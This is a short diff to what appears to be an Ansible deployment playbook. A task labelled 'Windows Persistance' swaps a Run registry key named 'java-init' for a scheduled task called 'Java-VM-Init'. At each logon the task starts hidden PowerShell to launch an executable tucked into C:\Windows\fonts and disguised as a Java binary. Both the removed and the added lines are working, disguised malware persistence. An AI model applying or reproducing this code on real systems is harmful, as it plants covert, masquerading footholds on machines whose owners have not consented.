@@ -50,11 +50,7 @@
     when: ansible_os_family == "Windows"
 
   - name: Windows Persistance
-    win_regedit: 
-      path: 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Run'
-      name: "java-init"
-      data: "PowerShell.exe -WindowStyle hidden 'C:\\Windows\\fonts\\jdk-23.0.1-bin-java.exe'"
-      type: string
+    ansible.windows.win_shell: 'Register-ScheduledTask -Action (New-ScheduledTaskAction -Execute "Powershell.exe" -Argument "-WindowStyle Hidden C:\Windows\fonts\jdk-23.0.1-bin-java.exe") -Trigger (New-ScheduledTaskTrigger -AtLogOn) -TaskName "Java-VM-Init"'
     when: ansible_os_family == "Windows"
 
   - name: Windows Run Agent
